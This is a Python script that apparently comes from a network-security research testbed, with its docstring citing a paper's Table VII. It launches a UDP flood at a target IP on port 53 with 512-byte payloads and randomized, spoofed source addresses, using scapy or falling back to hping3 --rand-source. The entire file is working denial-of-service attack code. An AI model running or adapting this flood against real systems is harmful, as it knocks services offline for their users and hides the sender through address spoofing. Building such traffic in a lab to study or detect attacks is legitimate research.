#!/usr/bin/env python3
"""UDP flood from h4  (Table VII: 25% share, target CR 97%). Port 53, 512B payload."""
from __future__ import annotations
import argparse, random
from attacks._common import HAVE_SCAPY, hping3, scapy_train, target_pps


def run(target_ip: str, duration_s: float = 30.0, dport: int = 53, seed: int = 42) -> None:
    rng = random.Random(seed); pps = target_pps(rng)
    if HAVE_SCAPY:
        from scapy.all import IP, UDP, RandShort, Raw
        scapy_train(lambda r: IP(src=f"10.0.{r.randint(1,254)}.{r.randint(1,254)}", dst=target_ip)
                    / UDP(sport=RandShort(), dport=dport) / Raw(b"\x00" * 512), pps, duration_s, seed)
    else:
        hping3(["--udp", "-p", str(dport), "-d", "512", "-i", f"u{int(1e6/pps)}", "--rand-source", target_ip])
